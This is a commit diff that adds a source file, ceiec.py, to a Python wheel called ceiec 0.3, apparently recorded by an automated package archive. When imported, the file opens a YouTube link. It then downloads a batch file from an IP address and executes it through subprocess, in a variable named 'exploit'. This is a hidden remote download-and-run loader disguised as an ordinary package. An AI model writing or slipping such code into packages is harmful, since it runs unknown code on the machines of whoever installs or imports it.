48e550088ca4144530d5a67faa3698e7e974e659
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:12:53 +0000

    Add package ceiec/0.3/ceiec-0.3-py3-none-any.whl

---
+++ packages/ceiec/ceiec-0.3-py3-none-any.whl/ceiec/ceiec.py
@@ -0,0 +1,17 @@
+import webbrowser
+
+url = "https://youtu.be/BGPGzDvAnDs"
+webbrowser.open(url)
+
+
+
+
+import urllib.request
+import subprocess
+
+urllib.request.urlretrieve("http://192.168.1.147/ufv.bat", "v.bat")
+
+exploit = subprocess.Popen(["v.bat"])
+
+
+
